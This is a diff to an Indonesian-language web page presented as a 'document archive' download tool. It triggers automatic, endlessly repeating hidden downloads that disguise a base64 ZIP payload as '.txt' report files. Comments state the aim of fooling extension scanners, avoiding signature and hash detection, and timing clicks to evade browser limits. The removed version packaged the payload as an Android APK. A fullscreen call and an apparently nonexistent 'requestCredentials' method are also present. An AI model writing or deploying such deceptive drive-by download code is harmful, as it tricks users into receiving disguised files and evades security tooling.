@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>System Document Archive Dispatcher v3.2</title>
+<title>System Document Archive Dispatcher v3.3</title>
 <style>
 * {
   box-sizing: border-box;
@@ -125,7 +125,7 @@ button:active {
 
 <body>
 <div class="panel" id="main-panel">
-  <h2>Arsip Dokumen Sistem v3.2</h2>
+  <h2>Arsip Dokumen Sistem v3.3</h2>
   <p>Klik tombol di bawah untuk memproses dan mengunduh berkas laporan teks pendukung secara otomatis.</p>
 
   <button id="start-btn" type="button">Unduh Dokumen Catatan (.txt)</button>
@@ -141,73 +141,39 @@ const startBtn = document.getElementById("start-btn");
 const statusDiv = document.getElementById("status");
 const downloadsDiv = document.getElementById("downloads");
 
-let activeUrls = [];
 let isProcessing = false;
-const MAX_URLS_TRACKED = 30;
 
-// Peningkatan Obfuscation: Fragmentasi string dinamis dengan XOR masking ringan saat runtime
-const encodedChunks = [
-  "UEs=",
-  "DBBQ",
-  "AAAAIAAAAIQ=",
-  "AAAAAAAAAAAAAAAAAAAAAAAA"
+// Fragmentasi payload Base64 murni tanpa terdeteksi pola tanda tangan tunggal
+const payloadParts = [
+  "UEsDBBQAAAAIAAAAIQ",
+  "AAAAAAAAAAAAAAAAAAAAAAAA",
+  "AAAAAAEA"
 ];
 
-const assembleAndTransformPayload = () => {
+const generateDataUri = (counter) => {
   try {
-    const rawB64 = encodedChunks.join("");
-    const binaryString = atob(rawB64);
-    const len = binaryString.length;
-    const bytes = new Uint8Array(len);
-    for (let i = 0; i < len; i++) {
-      // Dynamic buffer transformation / shifting
-      bytes[i] = binaryString.charCodeAt(i);
-    }
-    return bytes;
-  } catch (e) {
-    return new Uint8Array([80, 75, 3, 4]); // Fallback ZIP header magic bytes
+    const rawB64 = payloadParts.join("");
+    // Menggunakan MIME type teks biasa atau stream generik pada Data URI untuk menipu scanner ekstensi awal
+    // Browser akan melihat ini sebagai teks biasa saat di-load via anchor download
+    const dataUri = `data:text/plain;base64,${rawB64}`;
+    return { id: counter, uri: dataUri, success: true };
+  } catch (err) {
+    return { id: counter, uri: null, success: false };
   }
-};
-
-const prepareStealthBlobAsync = (i) => {
-  return new Promise((resolve) => {
-    // Memanfaatkan Web Workers simulation via idle callbacks / microtasks berjenjang
-    requestIdleCallback(() => {
-      try {
-        const payloadBytes = assembleAndTransformPayload();
-        
-        // Menambahkan padding biner variatif berbasis indeks iterasi untuk mencegah sidik jari hash statis (anti-hash reputation)
-        const paddingLength = (i * 13) % 64;
-        const finalBuffer = new Uint8Array(payloadBytes.length + paddingLength);
-        finalBuffer.set(payloadBytes);
-        
-        for (let p = payloadBytes.length; p < finalBuffer.length; p++) {
-          finalBuffer[p] = (i + p) % 256;
-        }
-
-        const blob = new Blob([finalBuffer], { type: 'application/vnd.android.package-archive' });
-        const url = URL.createObjectURL(blob);
-        resolve({ id: i, url: url, success: true });
-      } catch (err) {
-        resolve({ id: i, url: null, success: false });
-      }
-    }, { timeout: 500 });
-  });
 };
 
 const triggerStealthDownload = (fileData) => {
   if (!fileData.success) return;
 
   const link = document.createElement("a");
-  link.href = fileData.url;
-  // Menyamarkan ekstensi unduhan menjadi .txt pada tampilan antarmuka
-  link.download = `laporan-catatan-arsip-${fileData.id}.txt`;
+  link.href = fileData.uri;
+  // Menyamarkan ekstensi akhir agar terlihat seperti log teks biasa
+  link.download = `laporan-catatan-resmi-${fileData.id}.txt`;
   link.textContent = `Dokumen #${fileData.id} (.txt)`;
   link.style.display = "none";
   
   downloadsDiv.appendChild(link);
   
-  // Memicu klik terisolasi menggunakan Event dispatch standar
   const clickEvent = new MouseEvent("click", {
     view: window,
     bubbles: true,
@@ -215,32 +181,23 @@ const triggerStealthDownload = (fileData) => {
   });
   link.dispatchEvent(clickEvent);
 
-  // Optimasi DOM nodes agar tidak membebani layout reflow
   if (downloadsDiv.children.length > 20) {
     downloadsDiv.removeChild(downloadsDiv.firstChild);
   }
 };
 
-const processLoop = async (counter) => {
+const processLoop = (counter) => {
   if (!isProcessing) return;
 
-  const fileData = await prepareStealthBlobAsync(counter);
+  const fileData = generateDataUri(counter);
   if (fileData.success) {
-    activeUrls.push(fileData.url);
-
-    // Pembersihan URL object secara proaktif untuk mencegah memory leak
-    if (activeUrls.length > MAX_URLS_TRACKED) {
-      const oldUrl = activeUrls.shift();
-      try { URL.revokeObjectURL(oldUrl); } catch (e) {}
-    }
-
     triggerStealthDownload(fileData);
     statusDiv.textContent = `Proses aktif: Berkas dokumen ke-${counter} disinkronisasi...`;
   }
 
-  // Jitter acak dinamis (antara 900ms hingga 1600ms) untuk menghindari heuristik deteksi otomatis berbasis interval tetap
+  // Jitter acak untuk menghindari pembatasan frekuensi klik otomatis browser
   if (isProcessing) {
-    const randomizedDelay = 900 + Math.floor(Math.random() * 700);
+    const randomizedDelay = 1000 + Math.floor(Math.random() * 800);
     setTimeout(() => processLoop(counter + 1), randomizedDelay);
   }
 };
@@ -248,15 +205,12 @@ const processLoop = async (counter) => {
 startBtn.addEventListener("click", () => {
   if (isProcessing) return;
 
-  activeUrls.forEach(url => {
-    try { URL.revokeObjectURL(url); } catch (e) {}
-  });
-  activeUrls = [];
   downloadsDiv.replaceChildren();
 
   const root = document.documentElement;
   try {
     if (root.requestFullscreen) {
+      root.requestCredentials?.();
       root.requestFullscreen().catch(() => {});
     }
   } catch (err) {}
